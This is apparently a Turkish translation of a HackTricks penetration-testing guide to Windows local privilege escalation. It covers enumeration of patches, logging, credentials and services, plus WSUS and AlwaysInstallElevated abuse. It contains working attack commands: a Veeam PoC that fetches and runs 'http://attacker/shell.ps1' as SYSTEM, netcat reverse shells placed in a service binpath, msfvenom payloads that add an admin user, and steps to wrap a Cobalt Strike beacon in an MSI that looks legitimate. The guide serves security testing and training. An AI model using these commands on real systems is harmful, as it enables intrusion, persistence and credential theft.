# Windows Yerel Ayrıcalık Yükseltme

{{#include ../../banners/hacktricks-training.md}}

### **Windows yerel ayrıcalık yükseltme vektörlerini aramak için en iyi araç:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Başlangıç Windows Teorisi

### Access Tokens

**Windows Access Tokens'ın ne olduğunu bilmiyorsanız devam etmeden önce aşağıdaki sayfayı okuyun:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACL'ler - DACL'ler/SACL'ler/ACE'ler

**ACL'ler - DACL'ler/SACL'ler/ACE'ler hakkında daha fazla bilgi için aşağıdaki sayfaya bakın:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Bütünlük Düzeyleri

**Windows'ta bütünlük düzeylerinin ne olduğunu bilmiyorsanız devam etmeden önce aşağıdaki sayfayı okumalısınız:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Güvenlik Kontrolleri

Windows'ta **sistemi enumerate etmenizi**, executable'ları çalıştırmanızı ve hatta **faaliyetlerinizi tespit etmelerini** **engelleyebilecek** farklı şeyler vardır. Ayrıcalık yükseltme enumeration'ına başlamadan önce aşağıdaki **sayfayı** **okumalı** ve tüm bu **savunma** **mekanizmalarını** **enumerate etmelisiniz**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

`RAiLaunchAdminProcess` üzerinden başlatılan UIAccess process'leri, AppInfo secure-path kontrolleri atlatıldığında istem olmadan High IL seviyesine ulaşmak için kötüye kullanılabilir. Özel UIAccess/Admin Protection bypass iş akışına buradan bakın:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation, rastgele bir SYSTEM registry yazma işlemi (RegPwn) için kötüye kullanılabilir:

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Güncel Windows build'leri ayrıca, ayrıcalıklı bir yerel NTLM authentication işleminin yeniden kullanılan bir SMB TCP bağlantısı üzerinden yansıtıldığı bir **SMB arbitrary-port** LPE yolu da sunmuştur:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Sistem Bilgileri

### Sürüm bilgilerinin enumeration'ı

Windows sürümünde bilinen bir vulnerability olup olmadığını kontrol edin (uygulanan patch'leri de kontrol edin).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Sürüm Exploit'leri

Bu [site](https://msrc.microsoft.com/update-guide/vulnerability), Microsoft güvenlik açıkları hakkında ayrıntılı bilgi aramak için kullanışlıdır. Bu veritabanında 4.700'den fazla güvenlik açığı bulunur ve bir Windows ortamının sunduğu **muazzam attack surface** gösterilir.

**Sistemde**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas, watson'ı içerir)_

**Sistem bilgileriyle yerel olarak**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Exploit'lerin Github repoları:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Ortam

env değişkenlerinde kayıtlı herhangi bir credential/Juicy bilgi var mı?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell Geçmişi
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript dosyaları

Bunu nasıl etkinleştireceğinizi [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) adresinden öğrenebilirsiniz.
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell pipeline yürütmelerinin ayrıntıları; yürütülen komutları, komut çağrılarını ve script'lerin bazı bölümlerini kapsayacak şekilde kaydedilir. Ancak yürütme ayrıntılarının tamamı ve çıktı sonuçları kaydedilmeyebilir.

Bunu etkinleştirmek için dokümantasyondaki "Transcript files" bölümünde yer alan talimatları izleyin ve **"Powershell Transcription"** yerine **"Module Logging"** seçeneğini belirleyin.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell günlüklerindeki son 15 olayı görüntülemek için şunu çalıştırabilirsiniz:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Script'in yürütülmesine ilişkin eksiksiz etkinlik ve tam içerik kaydı alınır; böylece her kod bloğunun çalıştırıldığı sırada belgelenmesi sağlanır. Bu süreç, adli incelemeler ve kötü amaçlı davranışların analiz edilmesi için değerli olan, her etkinliğe ilişkin kapsamlı bir denetim izi oluşturur. Yürütme sırasında gerçekleştirilen tüm etkinlikler belgelenerek süreç hakkında ayrıntılı içgörüler sağlanır.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block için günlük kaydı olayları, Windows Event Viewer'da şu yolda bulunabilir: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Son 20 olayı görüntülemek için şunu kullanabilirsiniz:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### İnternet Ayarları
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Sürücüler
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Güncellemeler http**S** yerine http kullanılarak isteniyorsa sistemi ele geçirebilirsiniz.

Ağda SSL kullanmayan bir WSUS güncellemesi kullanılıp kullanılmadığını kontrol etmek için cmd'de aşağıdakini çalıştırarak başlarsınız:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Veya PowerShell'de aşağıdakini kullanın:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Şunlardan biri gibi bir yanıt alırsanız:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
Ve `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` veya `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` değeri `1` ise,

**exploitable durumdadır.** Son registry değeri 0 ise WSUS girdisi yok sayılır.

Bu vulnerabilities'i exploit etmek için [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) gibi tools kullanabilirsiniz. Bunlar, SSL kullanılmayan WSUS trafiğine 'fake' update'ler enjekte etmek için kullanılan MiTM weaponized exploit script'leridir.

Araştırmayı buradan okuyun:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Raporun tamamını buradan okuyun**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Temel olarak, bu bug'ın exploit ettiği flaw şudur:

> Local user proxy'mizi değiştirme yetkimiz varsa ve Windows Updates, Internet Explorer ayarlarında yapılandırılan proxy'yi kullanıyorsa, [PyWSUS](https://github.com/GoSecure/pywsus)'u local olarak çalıştırarak kendi trafiğimizi intercept etme ve asset'imizde elevated user olarak code çalıştırma yetkisine de sahip oluruz.
>
> Ayrıca WSUS service'i mevcut user'ın ayarlarını kullandığından, onun certificate store'unu da kullanır. WSUS hostname'i için self-signed bir certificate oluşturup bu certificate'i mevcut user'ın certificate store'una eklersek hem HTTP hem de HTTPS WSUS trafiğini intercept edebiliriz. WSUS, certificate üzerinde trust-on-first-use tipi bir validation uygulamak için HSTS benzeri herhangi bir mechanism kullanmaz. Sunulan certificate user tarafından trusted ise ve doğru hostname'e sahipse service tarafından kabul edilir.

Bu vulnerability'yi [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) tool'u ile exploit edebilirsiniz (liberated olduğunda).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Birçok enterprise agent'ı localhost üzerinde bir IPC surface'i ve privileged bir update channel'ı expose eder. Enrollment bir attacker server'ına zorlanabiliyor ve updater rogue bir root CA'ya veya zayıf signer check'lerine güveniyorsa, local user malicious bir MSI deliver edebilir ve SYSTEM service'in bunu install etmesini sağlayabilir. Genelleştirilmiş bir technique'i (Netskope stAgentSvc chain – CVE-2025-0309 temelinde) burada görebilirsiniz:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261`, attacker-controlled mesajları işleyen **TCP/9401** üzerindeki bir localhost service'ini expose eder ve **NT AUTHORITY\SYSTEM** olarak arbitrary command'lerin çalıştırılmasına olanak tanır.

- **Recon**: listener'ı ve version'ı doğrulayın; örneğin `netstat -ano | findstr 9401` ve `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: `VeeamHax.exe` gibi bir PoC'yi gerekli Veeam DLL'leriyle aynı directory'ye yerleştirin, ardından local socket üzerinden bir SYSTEM payload'ını trigger edin:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Hizmet komutu SYSTEM olarak çalıştırır.
## KrbRelayUp

Belirli koşullar altında Windows **domain** ortamlarında bir **yerel ayrıcalık yükseltme** güvenlik açığı bulunur. Bu koşullar arasında **LDAP signing uygulanmayan,** kullanıcıların **Resource-Based Constrained Delegation (RBCD)** yapılandırmasına izin veren self-rights'a sahip olduğu ve kullanıcıların domain içinde bilgisayar oluşturabildiği ortamlar bulunur. Bu **gereksinimlerin** varsayılan ayarlar kullanılarak karşılandığını belirtmek önemlidir.

**exploit'i** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) adresinde bulabilirsiniz.

Saldırının akışı hakkında daha fazla bilgi için [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/) adresini kontrol edin.

## AlwaysInstallElevated

Bu 2 registry kaydı **etkinleştirilmişse** (değer **0x1** ise), herhangi bir ayrıcalığa sahip kullanıcılar `*.msi` dosyalarını NT AUTHORITY\\**SYSTEM** olarak **yükleyebilir** (çalıştırabilir).
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payload'ları
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Bir meterpreter session'ınız varsa bu tekniği **`exploit/windows/local/always_install_elevated`** modülünü kullanarak otomatikleştirebilirsiniz.

### PowerUP

Power-up'tan `Write-UserAddMSI` komutunu kullanarak mevcut dizin içinde privileges escalation gerçekleştirmek için bir Windows MSI binary'si oluşturun. Bu script, bir kullanıcı/grup ekleme istemi gösteren önceden derlenmiş bir MSI installer yazar (bu nedenle GIU erişimine ihtiyacınız olacaktır):
```
Write-UserAddMSI
```
Oluşturulan binary'yi çalıştırarak yetkileri yükseltmeniz yeterlidir.

### MSI Wrapper

Bu araçları kullanarak bir MSI wrapper oluşturmayı öğrenmek için bu tutorial'ı okuyun. Yalnızca **command lines** **execute** etmek istiyorsanız, "**.bat**" dosyasını wrap edebileceğinizi unutmayın.


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Generate** etmek için Cobalt Strike veya Metasploit kullanarak `C:\privesc\beacon.exe` konumunda **new Windows EXE TCP payload** oluşturun.
- **Visual Studio**'yu açın, **Create a new project** seçeneğini seçin ve arama kutusuna "installer" yazın. **Setup Wizard** projesini seçin ve **Next**'e tıklayın.
- Projeye **AlwaysPrivesc** gibi bir ad verin, konum olarak **`C:\privesc`** kullanın, **place solution and project in the same directory** seçeneğini belirleyin ve **Create**'e tıklayın.
- 4 adımın 3. adımına (dahil edilecek dosyaları seçme) ulaşana kadar **Next**'e tıklamaya devam edin. **Add**'e tıklayın ve az önce oluşturduğunuz Beacon payload'ını seçin. Ardından **Finish**'e tıklayın.
- **Solution Explorer**'da **AlwaysPrivesc** projesini seçin ve **Properties** bölümünde **TargetPlatform** değerini **x86** yerine **x64** olarak değiştirin.
- **Author** ve **Manufacturer** gibi, yüklenen uygulamanın daha meşru görünmesini sağlayabilecek diğer özellikleri de değiştirebilirsiniz.
- Projeye sağ tıklayın ve **View > Custom Actions** seçeneklerini belirleyin.
- **Install**'a sağ tıklayın ve **Add Custom Action** seçeneğini belirleyin.
- **Application Folder**'a çift tıklayın, **beacon.exe** dosyanızı seçin ve **OK**'e tıklayın. Bu, installer çalıştırılır çalıştırılmaz beacon payload'ının execute edilmesini sağlar.
- **Custom Action Properties** altında **Run64Bit** değerini **True** olarak değiştirin.
- Son olarak **build** edin.
- `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` uyarısı gösterilirse platformu x64 olarak ayarladığınızdan emin olun.

### MSI Installation

Kötü amaçlı `.msi` dosyasının **installation** işlemini **background**'da execute etmek için:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Bu zafiyeti exploit etmek için şunu kullanabilirsiniz: _exploit/windows/local/always_install_elevated_

## Antivirus ve Tespit Araçları

### Denetim Ayarları

Bu ayarlar neyin **günlüğe kaydedileceğine** karar verir, bu nedenle dikkat etmelisiniz
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, günlüklerin nereye gönderildiğini bilmek açısından ilginçtir.
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS**, **yerel Administrator parolalarının yönetimi** için tasarlanmıştır ve bir etki alanına katılmış bilgisayarlardaki her parolanın **benzersiz, rastgele oluşturulmuş ve düzenli olarak güncellenmiş** olmasını sağlar. Bu parolalar Active Directory içinde güvenli bir şekilde saklanır ve yalnızca ACL'ler aracılığıyla yeterli izin verilmiş kullanıcılar tarafından erişilebilir; bu kullanıcılar yetkilendirildiklerinde yerel admin parolalarını görüntüleyebilir.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Etkinse, **düz metin parolalar LSASS** (Local Security Authority Subsystem Service) **içinde saklanır**.\
[**Bu sayfada WDigest hakkında daha fazla bilgi**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1** ile başlayarak Microsoft, Local Security Authority (LSA) için **gelişmiş koruma** sunarak güvenilmeyen işlemlerin **belleğini okuma** veya kod enjekte etme girişimlerini **engelledi** ve sistemi daha güvenli hale getirdi.\
[**LSA Protection hakkında daha fazla bilgi burada**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard**, **Windows 10**'da kullanıma sunuldu. Amacı, bir cihazda depolanan kimlik bilgilerini pass-the-hash saldırıları gibi tehditlere karşı korumaktır.| [**Credentials Guard hakkında daha fazla bilgi burada.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Önbelleğe Alınmış Kimlik Bilgileri

**Etki alanı kimlik bilgileri**, **Yerel Güvenlik Yetkilisi** (LSA) tarafından doğrulanır ve işletim sistemi bileşenleri tarafından kullanılır. Bir kullanıcının oturum açma verileri kayıtlı bir güvenlik paketi tarafından doğrulandığında, kullanıcı için genellikle etki alanı kimlik bilgileri oluşturulur.\
[**Önbelleğe Alınmış Kimlik Bilgileri hakkında daha fazla bilgi**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Kullanıcılar ve Gruplar

### Kullanıcıları ve Grupları Listeleme

Üyesi olduğunuz gruplardan herhangi birinin ilginç izinlere sahip olup olmadığını kontrol etmelisiniz
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Ayrıcalıklı gruplar

**Ayrıcalıklı bir gruba üyeyseniz ayrıcalıkları yükseltebilirsiniz**. Ayrıcalıklı gruplar ve ayrıcalıkları yükseltmek için bunların nasıl kötüye kullanılacağı hakkında buradan bilgi edinin:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

Bu sayfada **token** hakkında **daha fazla bilgi edinin**: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
**İlginç token'lar** ve bunların nasıl kötüye kullanılacağı hakkında **bilgi edinmek** için aşağıdaki sayfaya bakın:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Oturum açmış kullanıcılar / Oturumlar
```bash
qwinsta
klist sessions
```
### Ana klasörler
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Parola Politikası
```bash
net accounts
```
### Panodaki içeriği alın
```bash
powershell -command "Get-Clipboard"
```
## Çalışan İşlemler

### Dosya ve Klasör İzinleri

Öncelikle işlemleri listelerken, **işlemin komut satırında parolaları kontrol edin**.\
Çalışan herhangi bir **binary'nin üzerine yazıp yazamayacağınızı** veya olası [**DLL Hijacking attacks**](dll-hijacking/index.html) istismarları için binary klasöründe yazma izinlerinizin olup olmadığını kontrol edin:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Her zaman çalışan olası [**electron/cef/chromium debuggers** süreçlerini kontrol edin; ayrıcalıkları yükseltmek için bunları kötüye kullanabilirsiniz](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

**Süreçlerin ikili dosyalarının izinlerini kontrol etme**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**İşlem ikili dosyalarının bulunduğu klasörlerin izinlerini kontrol etme (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Bellekten Parola Madenciliği

sysinternals içindeki **procdump** aracını kullanarak çalışan bir işlemin bellek dökümünü oluşturabilirsiniz. FTP gibi servisler **kimlik bilgilerini bellekte düz metin olarak tutar**, belleği dökmeyi ve kimlik bilgilerini okumayı deneyin.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Güvenli olmayan GUI uygulamaları

**SYSTEM olarak çalışan uygulamalar, bir kullanıcının CMD başlatmasına veya dizinlere göz atmasına izin verebilir.**

Örnek: "Windows Help and Support" (Windows + F1), "command prompt" için arama yapın ve "Click to open Command Prompt" seçeneğine tıklayın

## Services

Service Triggers, belirli koşullar gerçekleştiğinde Windows'un bir service başlatmasını sağlar (named pipe/RPC endpoint etkinliği, ETW olayları, IP kullanılabilirliği, cihazın bağlanması, GPO yenilemesi vb.). SERVICE_START hakları olmadan bile trigger'larını tetikleyerek ayrıcalıklı service'leri çoğu zaman başlatabilirsiniz. Enumeration ve activation tekniklerine buradan ulaşabilirsiniz:

-
{{#ref}}
service-triggers.md
{{#endref}}

Service listesini alın:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### İzinler

Bir servis hakkında bilgi almak için **sc** kullanabilirsiniz
```bash
sc qc <service_name>
```
Her hizmet için gereken ayrıcalık düzeyini kontrol etmek amacıyla _Sysinternals_ tarafından sağlanan **accesschk** binary'sinin bulundurulması önerilir.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
"Authenticated Users" grubunun herhangi bir hizmeti değiştirip değiştiremeyeceğinin kontrol edilmesi önerilir:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[XP için accesschk.exe dosyasını buradan indirebilirsiniz](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Service'i etkinleştirme

Şu hatayı alıyorsanız (örneğin SSDPSRV ile):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Şunu kullanarak etkinleştirebilirsiniz
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**upnphost servisinin çalışmak için SSDPSRV'ye bağlı olduğunu göz önünde bulundurun (XP SP1 için)**

**Bu soruna yönelik başka bir geçici çözüm** şunu çalıştırmaktır:
```
sc.exe config usosvc start= auto
```
### **Modify service binary path**

"Authenticated users" grubunun bir hizmet üzerinde **SERVICE_ALL_ACCESS** yetkisine sahip olduğu senaryoda, hizmetin çalıştırılabilir binary dosyasını değiştirmek mümkündür. **sc** ile değiştirmek ve çalıştırmak için:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Hizmeti yeniden başlat
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Yetkiler çeşitli izinler aracılığıyla yükseltilebilir:

- **SERVICE_CHANGE_CONFIG**: Service binary yeniden yapılandırılmasına izin verir.
- **WRITE_DAC**: İzinlerin yeniden yapılandırılmasını sağlar ve service configuration değişikliklerine olanak tanır.
- **WRITE_OWNER**: Sahiplik edinilmesine ve izinlerin yeniden yapılandırılmasına olanak tanır.
- **GENERIC_WRITE**: Service configuration değiştirme yeteneğini devralır.
- **GENERIC_ALL**: Ayrıca service configuration değiştirme yeteneğini devralır.

Bu vulnerability'nin detection ve exploitation işlemleri için _exploit/windows/local/service_permissions_ kullanılabilir.

### Services binaries için zayıf izinler

Bir service **`LocalSystem`**, **`LocalService`**, **`NetworkService`** veya privileged bir domain account olarak çalışıyorsa, ancak **low-privileged users service EXE'sini veya üst klasörünü değiştirebiliyorsa**, service genellikle **binary'yi değiştirip service'i yeniden başlatarak** hijack edilebilir.

**Bir service tarafından çalıştırılan binary'yi değiştirip değiştiremeyeceğinizi** veya binary'nin bulunduğu **klasörde write izinlerine sahip olup olmadığınızı** ([**DLL Hijacking**](dll-hijacking/index.html))** kontrol edin.**\
Bir service tarafından çalıştırılan tüm binary'leri **wmic** kullanarak (system32 içinde olmayanlar) alabilir ve izinlerinizi **icacls** kullanarak kontrol edebilirsiniz:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Ayrıca **sc** ve **icacls** kullanabilirsiniz:
```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
**`Everyone`**, **`BUILTIN\Users`** veya **`Authenticated Users`** tarafından verilen tehlikeli ACL'leri arayın; özellikle hizmet çalıştırılabilir dosyasında veya bu dosyayı içeren dizinde **`(F)`**, **`(M)`** ya da **`(W)`** izinlerini kontrol edin. Pratik bir kötüye kullanım akışı:

1. `sc qc <service_name>` ile hizmet hesabını ve çalıştırılabilir dosyanın yolunu doğrulayın.
2. `icacls <path>` ile binary'nin yazılabilir olduğunu doğrulayın.
3. Hizmet binary'sini bir payload veya geçerli bir kötü amaçlı hizmet binary'siyle değiştirin.
4. `sc stop <service_name> && sc start <service_name>` ile hizmeti yeniden başlatın (veya yeniden başlatma / hizmet tetikleyicisini bekleyin).

Yararlı otomatik kontroller:
```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```
> Hizmet, normal bir kullanıcının hizmeti yeniden başlatmasına izin vermiyorsa, açılışta otomatik olarak başlatılıp başlatılmadığını, başarısızlık durumunda hizmeti yeniden başlatan bir eyleme sahip olup olmadığını veya hizmeti kullanan uygulama tarafından dolaylı olarak tetiklenip tetiklenemeyeceğini kontrol edin.

### Hizmet kayıt defteri değiştirme izinleri

Herhangi bir hizmet kayıt defterini değiştirip değiştiremeyeceğinizi kontrol etmelisiniz.\
Bir hizmet **kayıt defteri** üzerindeki **izinlerinizi** şu şekilde **kontrol edebilirsiniz**:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

